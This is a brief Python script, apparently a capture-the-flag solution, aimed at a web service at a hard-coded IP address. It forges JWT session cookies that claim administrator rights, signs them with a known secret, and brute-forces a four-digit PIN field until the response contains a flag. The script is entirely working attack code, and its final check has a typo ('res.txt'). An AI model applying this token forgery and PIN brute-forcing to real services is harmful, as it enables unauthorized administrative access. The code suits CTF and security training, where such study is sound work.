url="http://34.107.22.119:31671/"

import requests
import jwt

for i in range(9999,999,-1):
    cookie=jwt.encode({
        "user": "admin",
        "is_admin": True,
        "flag": True,
        "pin": i
    },"a-string-secret-at-least-256-bits-long",None,{
        "alg": "HS256",
        "typ": "JWT"
    })
    print(i)
    res=requests.get(url=url,cookies={"sessionKey":cookie})
    if "pin is not valid." in res.text:
        continue
    print(res.text)
    if "CTF{" in res.txt:break
